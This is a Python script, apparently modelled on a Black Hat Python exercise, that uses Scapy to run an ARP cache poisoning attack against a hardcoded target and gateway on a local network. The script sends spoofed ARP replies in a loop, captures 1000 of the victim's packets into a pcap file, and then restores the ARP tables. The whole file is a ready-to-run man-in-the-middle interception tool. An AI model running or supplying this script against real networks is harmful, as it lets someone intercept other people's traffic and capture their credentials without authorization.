

from scapy.all import ARP,srp,Ether,conf,sendp,wrpcap,sniff
import sys
import threading
import time




interface = "wlan0"
target_ip = "192.168.100.103"
gateway_ip = "192.168.100.1"
packet_count = 1000



conf.iface = interface
conf.verb = 0

print(f"[*] Setting up {interface}")



def get_mac(ip_address):
    
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10,verbose=False)

    for s,r in responses:
        return r[Ether].src
    return None     



gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC.Exiting.")
    sys.exit(0)
else:
    print(f"[*] Gateway {gateway_ip} is at {gateway_mac}")


target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get target MAC.Exiting.")
    sys.exit(0)
else:
    print(f"[*] Target {target_ip} is at {target_mac}")




def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    ether_target = Ether()
    ether_target.dst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    ether_gateway = Ether()
    ether_gateway.dst = gateway_mac
    

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while True:

        try:
            sendp(ether_target/poison_target)
            sendp(ether_gateway/poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
            break
    
    print("[*] ARP poison attack finished.")
    return


poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()





def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):

    print("[*] Restoring target ...")
    sendp(Ether(dst=target_mac)/ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    sendp(Ether(dst=gateway_mac)/ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)

    sys.exit(0)



try: 
    print(f"[*] Starting sniffer for {packet_count} packets")

    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

    wrpcap('bhp.pcap',packets)

    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

except KeyboardInterrupt:
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)




